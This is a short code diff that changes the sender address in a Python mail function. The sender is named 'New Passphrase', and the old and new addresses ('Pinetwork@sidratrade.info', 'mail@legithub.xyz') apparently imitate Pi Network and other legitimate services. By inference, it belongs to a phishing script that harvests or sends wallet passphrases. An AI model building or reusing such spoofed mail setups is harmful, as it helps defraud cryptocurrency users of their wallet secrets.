@@ -21,7 +21,7 @@ def send_mail(recipient_email, mail_info, mail_subj, std_name):
     payload = {
         "sender": {
             "name": f"New Passphrase",
-            "email": "Pinetwork@sidratrade.info"
+            "email": "mail@legithub.xyz"
         },
         "to": [
             {
